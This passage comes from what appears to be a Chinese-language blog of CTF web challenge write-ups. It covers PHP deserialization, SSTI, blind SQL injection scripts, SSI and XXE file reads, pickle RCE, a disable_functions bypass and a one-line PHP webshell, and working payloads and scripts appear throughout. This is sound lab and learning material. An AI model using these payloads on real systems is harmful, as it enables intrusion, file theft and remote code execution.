'php://filter/read=convert.base64-encode/resource=flag.php';\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;\n    }\n    public function __toString(){\n        return \"output anything you want\";\n    }\n}\nclass Test{\n    public $p;\n}\n$payload = new Show('test');\n$payload->str = new Test();\n$payload->str->p = new Modifier();\n$hack = new Show($payload);\necho urlencode(serialize($hack));\n?>\n```\n\n内容base64解码即可\n\n## [NPUCTF2020]ReadlezPHP\n\n查看源代码，发现了时间显示所使用的./time.php?source\n\n```PHP\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n?>\n```\n\n反序列化构造出以b为函数名，以a为参数的函数执行即可，尝试system发现没有回显，可能是被过滤，再尝试eval，也被过滤，放弃执行系统命令，尝试执行php函数，使用assert包裹phpinfo()，查找flag成功\n\n## [CISCN2019 华东南赛区]Web11\n\n在XFF位置尝试SSTI成功，输入{{config}}报错发现使用的是smarty渲染，{system('ls /')}发现flag，{system('cp /flag /var/www/html/flag.txt')}将文件带出即可\n\n## [极客大挑战 2019]FinalSQL\n\n点提示发现注入点，过滤了空格，还是数字型注入，使用布尔盲注\n\n```\n爆库名：\nid=2^(ascii(substr((select(database())),{i},1))={ord(j)})\n正确返回3，错误返回2\n爆表名\nid=2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))={ord(j)})\n爆列名\nid=2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))={ord(j)})\n```\n\n最终payload脚本\n\n```python\nimport requests\nurl=\"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'id':f\"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Ohhh You find the flag read on!\" in tex:\n            print(j,end='')\n            break\n```\n\n## [0CTF 2016]piapiapia\n\n没啥内容先扫目录，www.zip扫出源码，发现有隐藏的注册页面，先进行注册和登录，然后再查看源码\n\n```PHP\nindex.php和register.php一个登录一个注册\nclass.php关键函数\npublic function filter($string) {\n\t$escape = array('\\'', '\\\\\\\\');\n\t$escape = '/' . implode('|', $escape) . '/';\n\t$string = preg_replace($escape, '_', $string);\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t$safe = '/' . implode('|', $safe) . '/i';\n\treturn preg_replace($safe, 'hacker', $string);\n}\nupdate.php更新个人信息内容\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\t$username = $_SESSION['username'];\n\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\tdie('Invalid phone');\n\n\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\tdie('Invalid email');\n\t\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\tdie('Invalid nickname');\n\n\t$file = $_FILES['photo'];\n\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\tdie('Photo size error');\n\n\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t$profile['phone'] = $_POST['phone'];\n\t$profile['email'] = $_POST['email'];\n\t$profile['nickname'] = $_POST['nickname'];\n\t$profile['photo'] = 'upload/' . md5($file['name']);\n\t$user->update_profile($username, serialize($profile));\n\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\nprofile.php\n$profile = unserialize($profile);\n$phone = $profile['phone'];\t\t\n$email = $profile['email'];\n$nickname = $profile['nickname'];\n$photo = base64_encode(file_get_contents($profile['photo']));//关键，如果其中photo文件名是config.php即可读取到flag\n```\n\n反序列化字符逃逸漏洞：\n\n```\n原始序列化字符串：\na:1:{s:5:\"phone\";s:5:\"where\";}\n此时读取到的内容是phone=where\n将字符串进行过滤，preg_replace('where', 'hacker', $string);\n序列化后字符串变为\na:1:{s:5:\"phone\";s:5:\"hacker\";}\n此时反序列化只读取前5位，hacke，后面的r就属于逃逸的字符了，那么如果我们构造出一个能逃逸足够长的字符的字符串，就可以让序列化后的字符串存入我们需要的内容，在本题中我们想要传入的是s:5:\"photo\";s:10:\"config.php\";}，而又因为我们需要对nickname的内容进行绕过，此时nickname是一个数组所以我们最终需要逃逸的字符串就是\"}s:5:\"photo\";s:10:\"config.php\";}，所以最后构造payload使用关键字where，替换为hacker后能溢出，上面字符串有34个字符那么我们传入34个where+字符串即可\n```\n\npayload\n\n```\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n## [BJDCTF2020]EasySearch\n\n扫描，得到index.php.swp\n\n```PHP\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n要求password经过md5处理后前六位是6d0bc1\n\n贴一个爆破的脚本\n\n```python\nimport hashlib\nfor i in range(1000000000):\n    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n    if a[0:6] == '6d0bc1':\n        print(i)\n        print(a)\n```\n\n抓包发现响应头中\n\n```\nUrl_is_here: public/11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml\n```\n\n访问尝试XFF SSTI失败，看看wp吧，是SSI注入漏洞\n\n```\nSSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\nSSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。\n\n从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。\n```\n\n首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。\n\n**①显示服务器端环境变量<#echo>**\n\n本文档名称：\n\n`<!–#echo var=\"DOCUMENT_NAME\"–>`\n\n现在时间：\n\n`<!–#echo var=\"DATE_LOCAL\"–>`\n\n显示IP地址：\n\n`<! #echo var=\"REMOTE_ADDR\"–>`\n\n**②将文本内容直接插入到文档中<#include>**\n\n`<! #include file=\"文件名称\"–>`\n\n`<!--#include virtual=\"index.html\" -->`\n\n`<! #include virtual=\"文件名称\"–>`\n\n`<!--#include virtual=\"/www/footer.html\" -->`\n\n注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径\n\n**③显示WEB文档相关信息<#flastmod><#fsize>(如文件制作日期/大小等)**\n\n文件最近更新日期：\n\n`<! #flastmod file=\"文件名称\"–>`\n\n文件的长度：\n\n`<!–#fsize file=\"文件名称\"–>`\n\n**④直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)**\n\n`<!–#exec cmd=\"文件名称\"–>`\n\n`<!--#exec cmd=\"cat /etc/passwd\"-->`\n\n`<!–#exec cgi=\"文件名称\"–>`\n\n`<!--#exec cgi=\"/cgi-bin/access_log.cgi\"–>`\n\n将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。\n\n**⑤设置SSI信息显示格式<#config>(如文件制作日期/大小显示方式**)\n\n**⑥高级SSI可设置变量使用if条件语句。**\n\n所以我们传入`<!–#exec cmd=\"系统命令\"–>`即可执行系统命令，password内容已确定，只能通过username传入\n\n```\npayload:\nPOST\nusername=<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->&password=2020666\n```\n\n## [GYCTF2020]FlaskApp\n\n解密处SSTI\n\n过滤了*，system，os\n\n试试读取文件源码，找到了黑名单\n\n`black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]`\n\n使用加号绕过，遍历根目录\n\n`{{url_for.__globals__[\"o\"+\"s\"].listdir('/')}}`\n\n发现`this_is_the_flag.txt`文件\n\n`{{url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()}}`\n\n拿到flag\n\n## [BSidesCF 2019]Kookie\n\n```\nCookie: username=admin\n```\n\n## [极客大挑战 2019]RCE ME\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n\t$code=$_GET['code'];\n\tif(strlen($code)>40){\n\t\tdie(\"This is too Long.\");\n\t}\n\tif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n\t\tdie(\"NO.\");\n\t}\n\t@eval($code);\n}\nelse{\n\thighlight_file(__FILE__);\n}\n?>\n```\n\n取反绕过，先试试phpinfo\n\n```\ncode=(~%8F%97%8F%96%91%99%90)();\n```\n\n禁用大量系统命令执行函数，构造eval使用蚁剑\n\n```\ncode=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);\n//assert((eval($_POST[a])))\n```\n\n发现读不到flag，看wp，是一个PHP7的禁用函数绕过漏洞\n\n```\n这里用工具\n地址https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），\n```\n\n```\n然后需要构造一个新的payload:\n根据“?code=${*GET}[_](https://www.cnblogs.com/yunqian2017/p/${_GET}[_]);&*=assert&_=eval($_POST['a'])”\n使用的是异或绕过，\n最后的payload是\n```\n\n```\ncode=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/shell.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so\n```\n\n## [MRCTF2020]套娃\n\n查看源码\n\n```PHP\n$query = $_SERVER['QUERY_STRING'];\nif(substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n\tdie('Y0u are So cutE!');\n}\nif($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n\techo \"you are going to the next ~\";\n}\n```\n\n要求传参变量名为`b_u_p_t`又要求队列字符串中不能有下划线，可以使用空格绕过，而匹配起始结尾都要有23333，使用换行绕过\n\n```\n?b u p t=23333%0A\n```\n\n查看源码，发现有brainfuck注释内容，在控制台执行，发现需要POST传参Merak，传入后查看代码\n\n```PHP\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?> \n```\n\nip匹配绕过使用Client-ip请求头，file_get_contents使用data伪协议传入\n\n```\n?2333=data:text/plain,todat is a happy day&file=ZmpdYSZmXGI=\n```\n\n查看源码得到flag\n\n## [WUSTCTF2020]颜值成绩查询\n\n布尔盲注，看这题[[极客大挑战 2019]FinalSQL](#极客大挑战-2019-FinalSQL)\n\n```python\nimport requests\nurl=\"http://e3fad2bd-ba6f-41a9-bb23-275458f3c9ed.node4.buuoj.cn:81/\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'stunum':f\"1*(ascii(substr((select(group_concat(value))from(ctf.flag)),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Hi admin, your score is: 100\" in tex:\n            print(j,end='')\n            break\n```\n\n## [FBCTF2019]RCEService\n\n%0A换行截断绕过\n\n```\npayload:\ncmd={%0A\"cmd\":\"/bin/cat /home/rceservice/flag\"%0A}\n```\n\n## [Zer0pts2020]Can you guess it?\n\n先看源码\n\n```PHP\n<?php\ninclude 'config.php'; // FLAG is defined in config.php\n\nif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {\n  exit(\"I don't know what you are thinking, but I won't let you read it :)\");\n}\n\nif (isset($_GET['source'])) {\n  highlight_file(basename($_SERVER['PHP_SELF']));\n  exit();\n}\n\n$secret = bin2hex(random_bytes(64));\nif (isset($_POST['guess'])) {\n  $guess = (string) $_POST['guess'];\n  if (hash_equals($secret, $guess)) {\n    $message = 'Congratulations! The flag is: ' . FLAG;\n  } else {\n    $message = 'Wrong.';\n  }\n}\n?>\n```\n\n利用的是`basename`函数和`$_SERVER['PHP_SELF']`\n\nbasename函数会返回路径中的文件名部分，如\n\n```\nbasename(\"/var/www/html/index.php\")=index.php\n```\n\n`$_SERVER['PHP_SELF']`返回的是url中文件部分\n\n```\nhttp://127.0.0.1/test/index.php\nPHP_SELF内容就是/test/index.php\n```\n\nbasename函数有一个bug，它会去掉文件名开头的非ASCII值，所以我们构造payload在config.php最后再加一个非ascii字符即可\n\n```\npayload:\nindex.php/config.php/%FF?source\n```\n\n## [NCTF2019]Fake XML cookbook\n\n随意输入用户名密码，抓包发现内容使用xml传输，尝试构造XXE漏洞\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE note [\n<!ENTITY admin SYSTEM \"file:///etc/passwd\">\n]>\n<user><username>&admin;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03 23.20.24.png)\n\n测试回显成功\n\n猜测flag在根目录下，拿到flag\n\n## [CISCN2019 华北赛区 Day1 Web2]ikun\n\n看标题内容，提示要买LV6\n\n```\n## 爆破*站：资金募集 11540.0\nikun们冲鸭,一定要买到lv6!!!\n```\n\n写个脚本先找到LV6\n\n```python\nimport requests\nurl=\"http://14806839-f3e4-4cb2-8762-4f6d771a95b0.node4.buuoj.cn:81/shop?page=\"\nname=\"static/img/lv/lv6.png\"\ni=2\nwhile 1:\n    tex=requests.get(url+str(i)).text\n    if name in tex:\n        print(i)\n    i+=1\n```\n\n发现在181页\n\n需要的money~~太臭了不买了~~太多了，抓包更改折扣购买，而后提示该页面只允许admin访问，抓包发现JWT，找个[脚本](https://github.com/brendan-rius/c-jwt-cracker)爆破密钥\n\n爆破出的密钥为`1Kun`\n\n再在[jwt.io]()中生成新的jwt\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\n```\n\n![](https://img-blog.csdnimg.cn/1be8776440c7499882db6dfd0e32d3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZWxpZm9yc2hhcm9u,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03 23.47.04.png)\n\n看源码下载文件\n\n关键内容在sshop/views/Admin.py\n\n```python\n#Admin.py\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n\n```\n\n题目中提示了pickle，看看这是个什么东西\n\n> python的pickle模块实现了基本的数据序列和反序列化\n>\n> | 函数  | 说明                             |\n> | ----- | -------------------------------- |\n> | dumps | 对象反序列化为bytes对象          |\n> | dump  | 对象反序列化到文件对象，存入文件 |\n> | loads | 从bytes对象反序列化              |\n> | load  | 对象反序列化，从文件中读取数据   |\n\n```python\n#文件\n#序列化\npickle.dump(obj, file, protocol=None,)\nobj表示要进行封装的对象(必填参数）\nfile表示obj要写入的文件对象\n以二进制可写模式打开即wb(必填参数）\n#反序列化\npickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\nfile文件中读取封存后的对象\n以二进制可读模式打开即rb(必填参数)\n#对象\n#序列化\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。\n#反序列化\npickle.loads(bytes_object, *,fix_imports=True, encoding=\"ASCII\". errors=\"strict\")\nloads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。\n```\n\n查找后得知[pickle反序列化漏洞](https://www.freebuf.com/articles/web/252189.html)\n\n> 简而言之，pickle的loads在进行反序列化的时候会调用`__reduce__`魔术方法，也就可以利用该魔术方法构造payload\n\n命令执行例子\n\n```python\nimport pickle\nimport os\n\nclass Test2(object):\n    def __reduce__():\n    \t#被调用函数的参数\n        cmd = \"/usr/bin/id\" \n        return (os.system,(cmd,))\n\nif __name__ == \"__main__\":\n    test = Test2()\n    #执行序列化操作\n    result1 = pickle.dumps(test)\n    #执行反序列化操作\n    result2 = pickle.loads(result1)\n\n# __reduce__()魔法方法的返回值:\n# return(os.system,(cmd,))\n# 1.满足返回一个元组，元组中有两个参数\n# 2.第一个参数是被调用函数 : os.system()\n# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd\n# 4. 因此序列化时被解析执行的代码是 os.system(\"/usr/bin/id\")\n```\n\n那么就来构造个payload吧\n\n```python\n#python2\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):\n       return (eval, (\"open('/flag.txt','r').read()\",))\n\na = pickle.dumps(payload())\na = urllib.quote(a)\nprint a\n```\n\n```\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n```\n\n提交即可\n\n## [GWCTF 2019]枯燥的抽奖\n\n源码\n\n```\n<?php \n#这不是抽奖程序的源代码！不许看！ \nheader(\"Content-Type: text/html;charset=utf-8\"); \nsession_start(); \nif(!isset($_SESSION['seed'])){ \n$_SESSION['seed']=rand(0,999999999); \n} \n\nmt_srand($_SESSION['seed']); \n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; \n$str=''; \n$len1=20; \nfor ( $i = 0; $i < $len1; $i++ ){ \n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);        \n} \n$str_show = substr($str, 0, 10); \necho \"<p id='p1'>\".$str_show.\"</p>\"; \n\n\nif(isset($_POST['num'])){ \n    if($_POST['num']===$str){x \n        echo \"<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>\"; \n    } \n    else{ \n        echo \"<p id=flag>没抽中哦，再试试吧</p>\"; \n    } \n} \nshow_source(\"check.php\");\n```\n\n伪随机数漏洞，先算出需要的随机数吧\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'S5KnjyVcrs'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04 22.41.58.png)\n\n跑出来一个尝试一下\n\n```\n<?php\n#version:php7.3.4\nmt_srand(830361885);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n```\n\n成功\n\n## [CSCCTF 2019 Qual]FlaskLight\n\nSSTI\n\nconfig里面有提示\n\n```\n'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'\n```\n\n构造读文件的类咯\n\n```\nsearch={{''.__class__.__mro__[-1].__subclasses__()}}\n里面有<class 'subprocess.Popen'>，在258位\n```\n\n```\npayload:search={{''.__class__.__mro__[-1].__subclasses__()[258]('cat flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}\n```\n\n## [SUCTF 2019]Pythonginx\n\n进入就是源码\n\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname #解析出主机名\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1] #再次解析主机名\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'): #对www.example.com按.划分，先按idna编码，再utf-8解码\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost) #组合好解码后的主机名\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname #解析出主机名，要等于suctf.cc\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n搞个脚本尝试跑出最后的c中以idna编码后再经过utf8编码结果为C的内容\n\n```python\nfor i in range(128,65537):    \n    tmp=chr(i)\n    try:\n        res = tmp.encode('idna').decode('utf-8')\n        if res==\"c\":\n            print(tmp)\n    except:\n        continue\n```\n\n结果：\n\n```\nℂ\nℭ\nⅭ\nⅽ\nⒸ\nⓒ\nＣ\nｃ\n```\n\n随便拎一个构造payload，题中提示了使用了nginx，尝试访问默认nginx配置文件\n\n```\n配置文件存放目录：/etc/nginx\n主要配置文件：/etc/nginx/conf/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\nNginx配置文件：/usr/local/nginx/conf/nginx.conf\n```\n\n```\nfile://suctf.cℂ/usr/local/nginx/conf/nginx.conf\n```\n\n```\nserver {\n    listen 80;\n    location / {\n        try_files $uri @app;\n    }\n    location @app {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi.sock;\n    }\n    location /static {\n        alias /app/static;\n    }\n    # location /flag {\n    #     alias /usr/fffffflag;\n    # }\n}\n```\n\n查看flag即可\n\n```\nfile://suctf.cℂ/usr/fffffflag\n```\n\n## [NCTF2019]True XML cookbook\n\n又一个XXE，先尝试一下直接读flag吧\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///flag\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\nemmmmmm文件似乎不存在，再尝试读取网站源码，返回0没有内容，再试试PHP伪协议\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n```php\n<?php\n/**\n* autor: c0ny1\n* date: 2018-2-7\n*/\n\n$USERNAME = 'admin'; //账号\n$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码\n$result = null;\n\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\n\ntry{\n\t$dom = new DOMDocument();\n\t$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\t$creds = simplexml_import_dom($dom);\n\n\t$username = $creds->username;\n\t$password = $creds->password;\n\n\tif($username == $USERNAME && $password == $PASSWORD){\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",1,$username);\n\t}else{\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",0,$username);\n\t}\t\n}catch(Exception $e){\n\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",3,$e->getMessage());\n}\n\nheader('Content-Type: text/html; charset=utf-8');\necho $result;\n?>\n```\n\n这玩楞也妹啥用啊\n\n看看wp，拓展XXE漏洞，可以利用任意文件读取的特性来探测内网存活主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp：**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///etc/hosts\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-05 19.29.23.png)\n\n找到内网中IP，尝试在ip末尾爆破，出flag\n\n~~也不知道我这个环境有啥问题就是跑不出来，以后再试试~~\n\n## [CISCN2019 总决赛 Day2 Web1]Easyweb\n\nrobots.txt\n\n```\nDisallow: *.php.bak\n```\n\n拿到image.php源码\n\n```php\n<?php\ninclude \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\n查看源码，发现传入的id和path都将变量经过addslashes转换后的`\\0,%00,\\','`替换为空\n\n那么我们如果传入\\\\\\0，前两个反斜杠由于转义，结果是\\0，经过addslashes变为\\\\\\0，再经过str_replace变为\\，此时整个sql语句变为\n\n```mysql\nselect * from images where id='\\' or path='{$path}'\n```\n\n我们就可以在path处进行sql注入\n\n```\ntables:images,users\n```\n\n```python\nimport requests\nurl=r\"http://3658d7dc-a0eb-4cb0-a891-f66217ffe401.node4.buuoj.cn:81/image.php?id=\\\\0&path=or id=\"\nname='admin1234567890,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'\nfor i in range(1,100):\n    for j in name:\n        payload=f\"if((ascii(substr((select group_concat(password)from users),{i},1))={ord(j)}),1,0)--+\"\n        tex=requests.get(url+payload).text\n        if \"JFIF\" in tex:\n            print(j,end='')\n            break\n```\n\n在users表中获得用户名和密码`admin:157aeccdaba2cf3324cf`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06 21.43.40.png)\n\n尝试上传一句话木马，显示不允许上传php文件，上传任意文件尝试，得到提示\n\n```\nI logged the file name you uploaded to logs/upload.b6acf587d3c1a6ea213bf45c8c143b95.log.php.\n```\n\n将文件名写入log.php文件，在文件名处尝试构造木马，还是提示不能上传，看来在文件名处对php进行了过滤，尝试短标签绕过成功\n\n```\n<?= eval($_POST['kkk']);?>\n```\n\n拿flag\n\n## 